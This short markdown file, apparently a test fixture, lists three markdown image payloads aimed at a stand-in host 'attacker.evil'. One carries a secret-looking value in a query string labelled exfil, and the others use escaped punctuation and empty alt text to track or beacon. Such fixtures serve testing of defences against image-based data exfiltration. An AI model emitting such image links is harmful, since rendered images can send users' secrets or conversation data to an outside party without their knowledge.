# Markdown Image Attacks

Here is a standard markdown image:
![Company Logo](https://attacker.evil/exfil?k=secret123)

And an image with escaped markdown punctuation:
\!\[Hidden Tracker\](https://attacker.evil/track.png)

And an image with empty alt:
![](https://attacker.evil/beacon.gif)
